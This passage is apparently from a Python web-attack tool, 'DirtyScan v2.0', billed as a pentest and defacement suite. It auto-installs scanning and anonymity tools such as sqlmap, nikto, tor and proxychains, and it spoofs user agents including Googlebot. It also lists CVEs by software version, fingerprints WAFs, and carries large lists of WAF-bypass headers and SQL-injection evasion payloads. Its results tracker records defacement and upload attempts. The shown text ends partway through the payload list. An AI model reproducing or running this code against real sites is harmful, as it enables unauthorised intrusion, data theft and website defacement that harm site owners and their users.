#!/usr/bin/env python3
# ================================================================
# DirtyScan v2.0 — Full Pentest + Defacement Suite
# Author: Hydra Strozzz
# ================================================================

import os
import sys
import re
import time
import json
import random
import shutil
import signal
import hashlib
import base64
import platform
import subprocess
import urllib
import urllib.request
import urllib.error
import urllib.parse
import socket
import ssl
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ================================================================
# SECTION 0 — ENVIRONMENT + RAW ANSI
# ================================================================

IS_TERMUX = "com.termux" in os.environ.get("PREFIX", "") or os.path.exists("/data/data/com.termux")
IS_WINDOWS = platform.system().lower().startswith("win")
IS_LINUX = platform.system().lower() == "linux"
IS_MAC = platform.system().lower() == "darwin"

_R = "\033[91m"
_G = "\033[92m"
_Y = "\033[93m"
_B = "\033[94m"
_C = "\033[96m"
_M = "\033[95m"
_N = "\033[0m"

# ================================================================
# SECTION 0a — AUTO-INSTALL
# ================================================================

def _run(cmd, timeout=None, cwd=None):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True,
                           timeout=timeout, check=False, cwd=cwd)
        return p.returncode, p.stdout or "", p.stderr or ""
    except FileNotFoundError:
        return 127, "", "command not found"
    except subprocess.TimeoutExpired:
        return 124, "", "timeout"
    except Exception as e:
        return 1, "", str(e)


def _pip_install(pkgs):
    if isinstance(pkgs, str):
        pkgs = [pkgs]
    variants = [
        [sys.executable, "-m", "pip", "install"],
        [sys.executable, "-m", "pip", "install", "--user"],
        [sys.executable, "-m", "pip", "install", "--break-system-packages"],
    ]
    if shutil.which("pip"):
        variants.insert(0, ["pip", "install"])
    if shutil.which("pip3"):
        variants.insert(0, ["pip3", "install"])
    for base in variants:
        rc, _, _ = _run(base + ["-q"] + pkgs, timeout=600)
        if rc == 0:
            return True
    return False


def _pkg_install(pkgs):
    if isinstance(pkgs, str):
        pkgs = [pkgs]
    if IS_WINDOWS or IS_MAC:
        return False
    if IS_TERMUX and shutil.which("pkg"):
        rc, _, _ = _run(["pkg", "install", "-y"] + pkgs, timeout=900)
        return rc == 0
    if not shutil.which("apt") and not shutil.which("apt-get"):
        return False
    use_sudo = ""
    if os.geteuid() != 0 and shutil.which("sudo"):
        use_sudo = "sudo"
    apt = shutil.which("apt") or "apt-get"
    _run([use_sudo, apt, "update", "-qq"] if use_sudo else [apt, "update", "-qq"], timeout=300)
    cmd = [use_sudo, apt, "install", "-y", "-qq"] if use_sudo else [apt, "install", "-y", "-qq"]
    cmd += pkgs
    rc, _, _ = _run(cmd, timeout=900)
    return rc == 0


def _git_clone(repo, dest):
    if not shutil.which("git"):
        _pkg_install("git")
    if not shutil.which("git"):
        return False
    if os.path.exists(dest) and os.listdir(dest):
        return True
    parent = os.path.dirname(dest)
    if parent and not os.path.exists(parent):
        os.makedirs(parent, exist_ok=True)
    rc, _, _ = _run(["git", "clone", "--depth", "1", repo, dest], timeout=600)
    return rc == 0


def _have_py_module(name):
    try:
        __import__(name)
        return True
    except ImportError:
        return False


def _have_cmd(name):
    return shutil.which(name) is not None


PYTHON_REQS = [
    ("colorama", "colorama"),
    ("requests", "requests"),
    ("bs4", "beautifulsoup4"),
]

EXTERNAL_TOOLS = [
    ("git", "Git"),
    ("perl", "Perl"),
    ("nmap", "Port scanner"),
    ("tor", "Anonymity"),
    ("proxychains", "Proxy chain"),
]

TERMUX_PKG_OVERRIDES = {
    "git": "git",
    "perl": "perl",
    "nmap": "nmap",
    "tor": "tor",
    "proxychains": "proxychains-ng",
}

APT_PKG_OVERRIDES = {
    "git": "git",
    "perl": "perl",
    "nmap": "nmap",
    "tor": "tor",
    "proxychains": "proxychains4",
}

GIT_TOOLS = [
    ("sqlmap", "https://github.com/sqlmapproject/sqlmap.git",
     os.path.expanduser("~/tools/sqlmap"), "sqlmap.py", "SQL injection"),
    ("nikto", "https://github.com/sullo/nikto.git",
     os.path.expanduser("~/tools/nikto"), "program/nikto.pl", "Web scanner"),
]


def install_python_deps():
    print(f"{_C}[*] Python packages...{_N}")
    missing = []
    for mod, pip_name in PYTHON_REQS:
        if _have_py_module(mod):
            print(f"{_G}  [+] {pip_name} OK{_N}")
        else:
            print(f"{_Y}  [!] {pip_name} — installing...{_N}")
            missing.append(pip_name)
    if not missing:
        return True
    if _pip_install(missing):
        print(f"{_G}  [+] Python deps installed{_N}")
        return True
    print(f"{_R}  [-] pip failed. Manual: pip install {' '.join(missing)}{_N}")
    return False


def install_external_tools():
    print(f"{_C}[*] System tools...{_N}")
    for cmd, desc in EXTERNAL_TOOLS:
        if _have_cmd(cmd):
            print(f"{_G}  [+] {cmd} OK{_N}")
            continue
        print(f"{_Y}  [!] {cmd} — installing...{_N}")
        pkg = TERMUX_PKG_OVERRIDES.get(cmd, cmd) if IS_TERMUX else APT_PKG_OVERRIDES.get(cmd, cmd)
        if _pkg_install(pkg):
            print(f"{_G}  [+] {cmd} installed{_N}")
        else:
            print(f"{_R}  [-] {cmd} failed{_N}")


def _make_wrapper(cmd, entry_path, tool_dir):
    bindir = os.path.expanduser("~/.local/bin")
    os.makedirs(bindir, exist_ok=True)
    wrapper = os.path.join(bindir, cmd)
    shell = "/data/data/com.termux/files/usr/bin/bash" if IS_TERMUX else "/bin/bash"
    if not os.path.exists(shell):
        shell = "/bin/sh"
    if cmd == "sqlmap":
        body = f'#!{shell}\nexec python3 "{entry_path}" "$@"\n'
    elif cmd == "nikto":
        body = f'#!{shell}\ncd "{tool_dir}"\nexec perl "{entry_path}" "$@"\n'
    else:
        body = f'#!{shell}\nexec "{entry_path}" "$@"\n'
    try:
        with open(wrapper, "w") as f:
            f.write(body)
        os.chmod(wrapper, 0o755)
        print(f"{_G}  [+] wrapper: {wrapper}{_N}")
    except Exception as e:
        print(f"{_R}  [-] wrapper failed: {e}{_N}")


def install_git_tools():
    print(f"{_C}[*] Git tools...{_N}")
    if not _have_cmd("git"):
        _pkg_install("git")
    if not _have_cmd("git"):
        print(f"{_R}  [-] git unavailable{_N}")
        return
    for cmd, repo, dest, entry, desc in GIT_TOOLS:
        if _have_cmd(cmd):
            print(f"{_G}  [+] {cmd} OK{_N}")
            continue
        entry_path = os.path.join(dest, entry)
        if not os.path.exists(entry_path):
            print(f"{_Y}  [!] {cmd} — cloning...{_N}")
            if not _git_clone(repo, dest):
                print(f"{_R}  [-] {cmd} clone failed{_N}")
                continue
            print(f"{_G}  [+] {cmd} cloned{_N}")
        if cmd == "nikto" and not _have_cmd("perl"):
            _pkg_install("perl")
        _make_wrapper(cmd, entry_path, dest)


def install_all(auto=True):
    print(f"\n{_B}{'='*72}{_N}")
    print(f"{_B}|{' '*18}AUTO-INSTALL / REQUIREMENTS{' '*27}|{_N}")
    print(f"{_B}{'='*72}{_N}")
    print(f"{_C}[*] Platform: {platform.system()} {platform.release()}{_N}")
    if IS_TERMUX:
        print(f"{_C}[*] Termux detected{_N}")
    if not auto:
        print(f"{_Y}[!] Skipping auto-install{_N}")
        return
    install_python_deps()
    install_external_tools()
    install_git_tools()
    print(f"\n{_G}[+] Auto-install done{_N}\n")


AUTO_INSTALL = "--no-install" not in sys.argv
if AUTO_INSTALL:
    try:
        install_all(auto=True)
    except KeyboardInterrupt:
        print(f"\n{_Y}[!] Install interrupted{_N}")
        sys.exit(0)

# ================================================================
# SECTION 0c — IMPORTS
# ================================================================

try:
    import requests
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    print("[!] Missing requests/colorama")
    sys.exit(1)

try:
    from bs4 import BeautifulSoup
except ImportError:
    print("[!] Missing beautifulsoup4")
    sys.exit(1)

requests.packages.urllib3.disable_warnings()

AUTHOR = "Hydra Strozzz"
VERSION = "2.0"
BOLD = Style.BRIGHT
NC = Style.RESET_ALL
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
CYAN = Fore.CYAN
MAGENTA = Fore.MAGENTA

# ================================================================
# SECTION 0d — RESULTS TRACKER
# ================================================================

class Results:
    def __init__(self):
        self.target = None
        self.team_name = "Unknown"
        self.start_time = None
        self.end_time = None
        self.data = {
            "recon": {"status": None, "server": None, "powered_by": None, "tech": []},
            "waf": {"detected": [], "bypass_method": None, "bypassed": False},
            "cve": [],
            "cms": None,
            "wpscan": None,
            "config_leaks": [],
            "admin_panels": [],
            "auth_bypass": None,
            "params": [],
            "columns": {"count": 0, "params": [], "reflecting": [], "details": []},
            "sqli": [],
            "xss": [],
            "dirs": [],
            "ports": [],
            "headers": {},
            "missing_headers": [],
            "ssl": {"valid": False, "expires": None, "version": None},
            "robots": [],
            "upload": None,
            "deface": {"attempted": False, "success": False},
            "notes": [],
            "errors": [],
        }

    def start(self, target, team="Unknown"):
        self.target = target
        self.team_name = team
        self.start_time = datetime.now()

    def finish(self):
        self.end_time = datetime.now()

    def note(self, msg):
        self.data["notes"].append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

    def add_error(self, msg):
        self.data["errors"].append(f"{datetime.now().strftime('%H:%M:%S')} {msg}")


RESULTS = Results()

# ================================================================
# SECTION 1 — SESSION + BASELINE
# ================================================================

SESSION = requests.Session()
SESSION.verify = False

UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

BASELINE_TOKEN = "ds" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=14))
_BASELINES = {}


def rand_ua():
    return random.choice(UA_POOL)


def http_get(url, timeout=10, headers=None, allow_redirects=True):
    try:
        h = {"User-Agent": rand_ua()}
        if headers:
            h.update(headers)
        r = SESSION.get(url, timeout=timeout, headers=h, allow_redirects=allow_redirects)
        return r.status_code, dict(r.headers), r.text
    except requests.exceptions.RequestException:
        return None, None, None


def http_post(url, data=None, files=None, timeout=10, headers=None):
    try:
        h = {"User-Agent": rand_ua()}
        if headers:
            h.update(headers)
        r = SESSION.post(url, data=data or {}, files=files, timeout=timeout, headers=h)
        return r.status_code, dict(r.headers), r.text
    except requests.exceptions.RequestException:
        return None, None, None


def body_hash(b):
    return hashlib.md5((b or "").encode("utf-8", "ignore")).hexdigest()


def prime_baseline(url):
    parsed = urllib.parse.urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    if base in _BASELINES:
        return _BASELINES[base]
    rand = base + "/" + BASELINE_TOKEN + str(random.randint(1000, 9999))
    s, h, b = http_get(rand, timeout=8)
    if s is None:
        _BASELINES[base] = {"status": None, "hash": None, "len": 0}
    else:
        _BASELINES[base] = {"status": s, "hash": body_hash(b), "len": len(b or "")}
    return _BASELINES[base]


def is_real_hit(base_url, status, body):
    if status is None:
        return False
    bl = _BASELINES.get(base_url)
    if not bl or bl["status"] is None:
        return status not in (404, 410, 500)
    if status == bl["status"] and body_hash(body) == bl["hash"]:
        return False
    if status == 200 and bl["status"] == 200:
        if abs(len(body or "") - bl["len"]) < 40:
            if any(m in (body or "").lower() for m in ["not found", "does not exist", "no page", "404"]):
                return False
    return True


def get_response(url, timeout=10):
    s, h, b = http_get(url, timeout=timeout, allow_redirects=False)
    if s is None:
        return None, None, None
    parsed = urllib.parse.urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    if s == 200 and not is_real_hit(base, s, b):
        return 404, h, b
    return s, h, b

# ================================================================
# SECTION 2 — OUTPUT
# ================================================================

def print_info(m):
    print(f"{CYAN}[I] {m}{NC}")


def print_good(m):
    print(f"{GREEN}[+] {m}{NC}")


def print_warn(m):
    print(f"{YELLOW}[!] {m}{NC}")


def print_error(m):
    print(f"{RED}[-] {m}{NC}")


def print_hit(m):
    print(f"{MAGENTA}[★] {m}{NC}")


def print_section(t):
    w = 72
    print(f"\n{BLUE}{'='*w}{NC}")
    print(f"{BLUE}| {t:<{w-3}}|{NC}")
    print(f"{BLUE}{'='*w}{NC}")

# ================================================================
# SECTION 3 — CVE DB
# ================================================================

CVE_DB = {
    "WordPress": {
        "4.7": [("CVE-2017-1001000", "critical", "REST API content injection")],
        "5.0": [("CVE-2019-8942", "high", "RCE via image metadata")],
        "5.6": [("CVE-2021-29447", "high", "XXE via media upload")],
        "6.0": [("CVE-2022-21661", "critical", "SQLi in WP_Query")],
        "6.1": [("CVE-2023-22622", "medium", "XSS in dashboard")],
        "6.2": [("CVE-2023-2745", "medium", "Directory traversal")],
        "6.3": [("CVE-2023-39999", "medium", "XSS in comments")],
        "6.4": [("CVE-2023-6700", "medium", "RCE in POP3/IMAP parser")],
    },
    "Joomla": {
        "3.7": [("CVE-2017-8917", "critical", "SQLi in com_fields")],
        "3.9": [("CVE-2019-10945", "critical", "Directory traversal")],
        "4.0": [("CVE-2021-26037", "critical", "RCE via PHP upload")],
    },
    "Drupal": {
        "7.0": [("CVE-2018-7600", "critical", "Drupalgeddon2 RCE")],
        "8.0": [("CVE-2019-6340", "critical", "REST RCE")],
    },
    "Apache": {
        "2.4.49": [("CVE-2021-41773", "critical", "Path traversal + RCE")],
        "2.4.50": [("CVE-2021-42013", "critical", "Path traversal bypass")],
    },
    "nginx": {"1.20.0": [("CVE-2021-23017", "high", "DNS resolver")]},
    "PHP": {
        "7.4": [("CVE-2021-21707", "medium", "URL parsing")],
        "8.0": [("CVE-2022-31625", "high", "Buffer overflow")],
        "8.1": [("CVE-2023-3823", "high", "PHAR deserialization")],
    },
    "OpenSSH": {
        "7.4": [("CVE-2018-15473", "medium", "User enumeration")],
        "8.5": [("CVE-2021-41617", "medium", "Privilege escalation")],
    },
    "jQuery": {
        "1.": [("CVE-2019-11358", "medium", "Prototype pollution")],
        "2.": [("CVE-2019-11358", "medium", "Prototype pollution")],
        "3.4": [("CVE-2020-11022", "medium", "XSS via htmlPrefilter")],
    },
    "Bootstrap": {"3.": [("CVE-2019-8331", "medium", "XSS tooltip")]},
    "Laravel": {
        "5.": [("CVE-2018-15133", "high", "RCE unserialize")],
        "8.": [("CVE-2021-3129", "critical", "Ignition RCE")],
    },
    "Spring": {"4.3": [("CVE-2022-22965", "critical", "Spring4Shell RCE")]},
    "Log4j": {"2.": [("CVE-2021-44228", "critical", "Log4Shell JNDI RCE")]},
    "IIS": {"6.": [("CVE-2017-7269", "critical", "WebDAV RCE")]},
    "Tomcat": {"9.": [("CVE-2020-9484", "high", "Session RCE")]},
}

# ================================================================
# SECTION 4 — SQL ERROR PATTERNS
# ================================================================

SQL_ERROR_PATTERNS = [
    r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySQLSyntaxErrorException",
    r"valid MySQL result", r"MySqlException", r"ORA-[0-9]{5}", r"Oracle error",
    r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result",
    r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException",
    r"Warning.*sqlite_.*", r"valid SQLite result",
    r"Microsoft OLE DB Provider for ODBC Drivers",
    r"Microsoft OLE DB Provider for SQL Server", r"Driver.*SQL Server",
    r"SQLServer JDBC Driver", r"com.microsoft.sqlserver", r"Unclosed quotation mark",
    r"Microsoft JET Database Engine", r"Access Database Engine", r"ODBC Microsoft Access",
    r"DB2 SQL Error", r"DB2Exception", r"com.ibm.db2",
    r"Informix.*SQL Error", r"com.informix.jdbc",
    r"Sybase.*SQL Error", r"com.sybase.jdbc", r"Adaptive Server Enterprise",
    r"PDOException", r"mysqli_sql_exception",
    r"Unknown column '.*' in", r"Table '[^']+' doesn't exist",
    r"Column count doesn't match value count", r"Duplicate entry '.*' for key",
    r"You have an error in your SQL syntax",
]

# ================================================================
# SECTION 5 — WAF SIGNATURES
# ================================================================

WAF_SIGNATURES = {
    "Cloudflare": {"headers": ["CF-RAY", "CF-Cache-Status", "CF-Request-ID"],
                   "body": ["cloudflare", "cf-ray", "__cf_bm", "cf_chl_"]},
    "ModSecurity": {"headers": ["X-Mod-Security", "Mod-Security-Message"],
                    "body": ["mod_security", "ModSecurity", "Mod_Security"]},
    "AWS WAF": {"headers": ["X-Amzn-RequestId", "X-Amzn-Trace-Id", "X-Amz-Cf-Id"],
                "body": ["awselb", "x-amzn-requestid"]},
    "Akamai": {"headers": ["X-Akamai-Transformed", "X-Akamai-Request-ID", "Akamai-Grn"],
               "body": ["akamai", "ak-bmsc"]},
    "Imperva": {"headers": ["X-Protected-By", "X-Iinfo", "X-CDN"],
                "body": ["incapsula", "imperva", "_incap_ses_"]},
    "F5 BIG-IP": {"headers": ["X-Cnection", "X-WA-Info"], "body": ["BIG-IP", "F5", "TS01"]},
    "Sucuri": {"headers": ["X-Sucuri-ID", "X-Sucuri-Cache"], "body": ["sucuri", "cloudproxy"]},
    "Barracuda": {"headers": ["X-Barracuda"], "body": ["barracuda", "barra_counter_session"]},
    "FortiWeb": {"headers": ["X-WAF-Event-ID", "FORTIWAFSID"], "body": ["fortiweb"]},
    "NetScaler": {"headers": ["X-Citrix-Application"], "body": ["netscaler"]},
    "Radware": {"headers": ["X-SL-CompState"], "body": ["radware", "appwall"]},
    "Wallarm": {"headers": ["X-Wallarm-Request-ID"], "body": ["wallarm"]},
    "StackPath": {"headers": ["X-SP-Cache"], "body": ["stackpath"]},
    "Fastly": {"headers": ["X-Served-By", "Fastly-Debug-Digest"], "body": ["fastly"]},
    "Varnish": {"headers": ["X-Varnish"], "body": ["varnish"]},
    "AzureFD": {"headers": ["X-Azure-Ref"], "body": ["azurefd"]},
    "Wordfence": {"headers": ["X-Wordfence-Block-ID"], "body": ["wordfence", "wfvt_"]},
    "Comodo": {"headers": [], "body": ["comodo", "cwaf"]},
    "Palo Alto": {"headers": ["X-PA-WAF-ID"], "body": ["palo alto networks"]},
    "DenyAll": {"headers": ["X-DenyAll"], "body": ["denyall"]},
    "SafeDog": {"headers": ["X-Powered-By-Safedog"], "body": ["safedog", "waf_verify"]},
    "360WAF": {"headers": ["X-Powered-By-360WZB"], "body": ["360wzb"]},
    "Yunsuo": {"headers": ["Yunsuo-Request-ID"], "body": ["yunsuo"]},
    "DDoS-GUARD": {"headers": [], "body": ["ddos-guard"]},
    "Reblaze": {"headers": ["X-Reblaze", "RBZID"], "body": ["reblaze", "rbzid"]},
    "SafeLine": {"headers": ["X-SafeLine"], "body": ["safeline", "chaitin"]},
    "HAProxy": {"headers": [], "body": ["haproxy"]},
    "Envoy": {"headers": ["X-Envoy-Upstream-Service-Time"], "body": ["envoy"]},
    "Traefik": {"headers": [], "body": ["traefik"]},
}

# ================================================================
# SECTION 6 — WAF BYPASS HEADERS (expanded — 80+)
# ================================================================

WAF_BYPASS_HEADERS = [
    # IP spoofing
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"X-Forwarded-For": "10.0.0.1"},
    {"X-Forwarded-For": "192.168.1.1"},
    {"X-Forwarded-For": "127.0.0.1, 127.0.0.1"},
    {"X-Forwarded-For": "::1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Forwarded-Server": "127.0.0.1"},
    {"X-Host": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"Fastly-Client-IP": "127.0.0.1"},
    {"X-Cluster-Client-IP": "127.0.0.1"},
    {"Forwarded": "for=127.0.0.1;proto=https"},
    {"Forwarded-For": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1, 127.0.0.1"},
    {"Client-IP": "127.0.0.1"},
    {"X-Forwarded": "127.0.0.1"},
    {"X-Forwarded-For-Original": "127.0.0.1"},
    {"X-Forward-For": "127.0.0.1"},
    # URL override
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Override-URL": "/admin"},
    {"X-Forwarded-Path": "/admin"},
    {"X-Forwarded-Proto": "http"},
    {"X-Forwarded-SSL": "on"},
    {"X-URL": "/admin"},
    {"X-Original-URI": "/admin"},
    # Method override
    {"X-HTTP-Method-Override": "GET"},
    {"X-HTTP-Method": "GET"},
    {"X-Method-Override": "GET"},
    {"X-Original-Method": "GET"},
    {"X-HTTP-Method-Override": "PUT"},
    {"X-HTTP-Method-Override": "HEAD"},
    # Content-Type
    {"Content-Type": "application/x-www-form-urlencoded"},
    {"Content-Type": "text/plain"},
    {"Content-Type": "application/json"},
    {"Content-Type": "multipart/form-data"},
    {"Content-Type": "application/xml"},
    {"Content-Type": "text/xml"},
    {"Content-Type": "application/x-httpd-php"},
    # Encoding
    {"Accept-Encoding": "gzip, deflate, br"},
    {"Accept-Encoding": "identity"},
    {"Accept-Charset": "utf-8"},
    {"Accept-Charset": "iso-8859-1"},
    {"Accept-Language": "en-US,en;q=0.9"},
    # Cache
    {"Cache-Control": "no-cache"},
    {"Cache-Control": "max-age=0"},
    {"Cache-Control": "no-store"},
    {"Pragma": "no-cache"},
    {"Expires": "0"},
    # Referer / Origin
    {"Referer": "https://www.google.com/"},
    {"Referer": "https://127.0.0.1/"},
    {"Referer": "https://localhost/"},
    {"Origin": "https://www.google.com"},
    {"Origin": "http://127.0.0.1"},
    {"Origin": "null"},
    # Connection
    {"Connection": "keep-alive"},
    {"Connection": "close"},
    {"Connection": "TE"},
    # Chunked / request smuggling
    {"Transfer-Encoding": "chunked"},
    {"Transfer-Encoding": "identity"},
    {"Content-Length": "0"},
    # Misc
    {"X-Requested-With": "XMLHttpRequest"},
    {"X-Wap-Profile": "http://127.0.0.1/wap.xml"},
    {"DNT": "1"},
    {"Upgrade-Insecure-Requests": "1"},
    {"X-CSRF-Token": "x"},
    {"X-Forwarded-Port": "80"},
    {"X-Forwarded-Port": "443"},
    {"X-HTTP-Host-Override": "127.0.0.1"},
    {"X-Originating-URL": "/admin"},
    {"X-Request-ID": "1"},
    {"X-Correlation-ID": "1"},
    {"X-Api-Version": "1"},
    {"X-User-ID": "1"},
    {"X-Admin": "true"},
    {"X-Authenticated-User": "admin"},
]

# ================================================================
# SECTION 7 — WAF BYPASS PAYLOADS (expanded — 150+)
# ================================================================

WAF_BYPASS_TECHNIQUES_SQL = [
    # Comments
    {"name": "Comment OR", "payload": "'/**/OR/**/'1'='1"},
    {"name": "Inline comment UNION", "payload": "'/**/UNION/**/SELECT/**/1,2,3-- -"},
    {"name": "MySQL versioned comment", "payload": "'/*!50000UNION*//*!50000SELECT*/1,2,3-- -"},
    {"name": "MySQL 4-digit comment", "payload": "'/*!12345UNION*//*!12345SELECT*/1,2,3-- -"},
    {"name": "Optimizer hint", "payload": "' /**/+ '1'='1"},
    {"name": "Multi-comment", "payload": "'/**/OR/**/1=1/**/-- -"},
    {"name": "Between comment", "payload": "' OR/**/BETWEEN/**/0/**/AND/**/2-- -"},
    {"name": "Union comment inner", "payload": "' UNION/**/SELECT/**/1,2,3-- -"},
    {"name": "Nested comment", "payload": "'/**//**/OR/**//**/1=1-- -"},
    # Case
    {"name": "Case variation", "payload": "'/**/UnIoN/**/SeLeCt/**/1,2,3-- -"},
    {"name": "Mixed case OR", "payload": "' oR 1=1-- -"},
    {"name": "Case shift UNION", "payload": "' uNIoN sElEcT 1,2,3-- -"},
    {"name": "Case shift AND", "payload": "' aNd 1=1-- -"},
    {"name": "Random case OR", "payload": "' Or 1=1-- -"},
    {"name": "Random case UNION", "payload": "' UnIoN sElEcT 1,2,3-- -"},
    # Encoding
    {"name": "Hex encoding", "payload": "' OR 0x313d31-- -"},
    {"name": "Hex table", "payload": "' UNION SELECT 1,0x7573657273,3-- -"},
    {"name": "Double URL encoding", "payload": "%25%32%37%20%4F%52%20%27%31%27%3D%27%31"},
    {"name": "Triple URL encoding", "payload": "%2527%2520%254F%2552%25201%253D1"},
    {"name": "Null byte", "payload": "%00' OR '1'='1"},
    {"name": "Null byte suffix", "payload": "' OR '1'='1'%00"},
    {"name": "Overlong UTF-8", "payload": "%c0%a7 OR 1=1-- -"},
    {"name": "Unicode encoding", "payload": "\\u0027 OR 1=1-- -"},
    {"name": "Hex function", "payload": "' OR unhex('313d31')-- -"},
    {"name": "Base64 as hex", "payload": "' OR 0x31273d2731-- -"},
    {"name": "URL encoded space", "payload": "'%20OR%201=1-- -"},
    {"name": "Percent encoded quote", "payload": "%27 OR 1=1-- -"},
    # Whitespace
    {"name": "Tab separation", "payload": "'\tOR\t'1'='1"},
    {"name": "Line feed", "payload": "'\nOR\n'1'='1"},
    {"name": "CR injection", "payload": "'\rOR\r'1'='1"},
    {"name": "Multiline", "payload": "'\nOR\n'1'='1'--"},
    {"name": "Whitespace bypass", "payload": "'%09OR%0A'1'='1"},
    {"name": "No space", "payload": "'OR'1'='1"},
    {"name": "No space union", "payload": "'UNION(SELECT(1),(2),(3))-- -"},
    {"name": "Vertical tab", "payload": "'\vOR\v1=1-- -"},
    {"name": "Form feed", "payload": "'\fOR\f1=1-- -"},
    {"name": "Multiple spaces", "payload": "'     OR     1=1-- -"},
    {"name": "Mixed whitespace", "payload": "'%09%0A%0DOR%09%0A1=1-- -"},
    # Operators
    {"name": "Pipe OR", "payload": "' || '1'='1"},
    {"name": "Ampersand AND", "payload": "' && '1'='1"},
    {"name": "Like operator", "payload": "' OR '1' LIKE '1"},
    {"name": "RLIKE operator", "payload": "' OR '1' RLIKE '1"},
    {"name": "Between operator", "payload": "' OR 1 BETWEEN 0 AND 2-- -"},
    {"name": "In operator", "payload": "' OR 1 IN (1)-- -"},
    {"name": "Not in operator", "payload": "' OR 1 NOT IN (2)-- -"},
    {"name": "Not operator", "payload": "' OR NOT 1=2-- -"},
    {"name": "XOR operator", "payload": "' OR 1 XOR 1-- -"},
    {"name": "Div operator", "payload": "' OR 1 DIV 1-- -"},
    {"name": "Bitwise OR", "payload": "' OR 1|0=1-- -"},
    {"name": "Bitwise AND", "payload": "' OR 1&1=1-- -"},
    {"name": "Bitwise XOR", "payload": "' OR 1^0=1-- -"},
    {"name": "Bitshift left", "payload": "' OR 1<<1=2-- -"},
    {"name": "Bitshift right", "payload": "' OR 2>>1=1-- -"},
    {"name": "Modulo", "payload": "' OR 1%2=1-- -"},
    {"name": "Scientific notation", "payload": "' OR 1e0=1e0-- -"},
    {"name": "Comparison", "payload": "' OR 1>0-- -"},
    {"name": "Not equal", "payload": "' OR 1<>0-- -"},
    {"name": "Not equal 2", "payload": "' OR 1!=0-- -"},
    {"name": "Less than", "payload": "' OR 2<3-- -"},
    {"name": "Greater equal", "payload": "' OR 1>=1-- -"},
    {"name": "Less equal", "payload": "' OR 1<=1-- -"},
    {"name": "True constant", "payload": "' OR true-- -"},
    {"name": "False OR true", "payload": "' OR false OR 1=1-- -"},
    {"name": "Backtick bypass", "payload": "' OR `1`=`1`-- -"},
    {"name": "Negative value", "payload": "' OR '-1'='-1"},
    {"name": "String concat", "payload": "' OR 'a'='a'-- -"},
    # Functions
    {"name": "CHAR function", "payload": "' OR 1=CHAR(49)-- -"},
    {"name": "CHR function", "payload": "' OR 1=CHR(49)-- -"},
    {"name": "ASCII function", "payload": "' OR ASCII('A')=65-- -"},
    {"name": "Concat bypass", "payload": "' OR CONCAT('1','=','1')-- -"},
    {"name": "Concat_ws", "payload": "' OR CONCAT_WS('','1','=','1')-- -"},
    {"name": "If condition", "payload": "' OR IF(1=1,1,0)-- -"},
    {"name": "Case when", "payload": "' OR CASE WHEN 1=1 THEN 1 ELSE 0 END-- -"},
    {"name": "Coalesce", "payload": "' OR COALESCE(NULL,1)=1-- -"},
    {"name": "Nullif", "payload": "' OR NULLIF(1,2)=1-- -"},
    {"name": "Least", "payload": "' OR LEAST(1,2)=1-- -"},
    {"name": "Greatest", "payload": "' OR GREATEST(1,2)=2-- -"},
    {"name": "Round", "payload": "' OR ROUND(1.4)=1-- -"},
    {"name": "Floor", "payload": "' OR FLOOR(1.9)=1-- -"},
    {"name": "Ceil", "payload": "' OR CEIL(1.1)=2-- -"},
    {"name": "Abs", "payload": "' OR ABS(-1)=1-- -"},
    {"name": "Length", "payload": "' OR LENGTH('a')=1-- -"},
    {"name": "Substring", "payload": "' OR SUBSTRING('abc',1,1)='a'-- -"},
    # Parameter pollution
    {"name": "HPP", "payload": "id=1&id=1' OR '1'='1"},
    {"name": "HPP-encoded", "payload": "id=1%00' OR '1'='1"},
    {"name": "HPP-comma", "payload": "id=1,1' OR '1'='1"},
    {"name": "HPP-array", "payload": "id[]=1&id[]=1' OR '1'='1"},
    {"name": "HPP-json", "payload": 'id={"a":"1\' OR \'1\'=\'1"}'},
    # JSON / XML
    {"name": "JSON obfuscation", "payload": '{"id":"1\' OR \'1\'=\'1"}'},
    {"name": "JSON unicode", "payload": '{"id":"1\\u0027 OR 1=1-- -"}'},
    {"name": "JSON array", "payload": '{"id":["1\' OR \'1\'=\'1"]}'},
    {"name": "XML encoded", "payload": "&#39; OR &#39;1&#39;=&#39;1"},
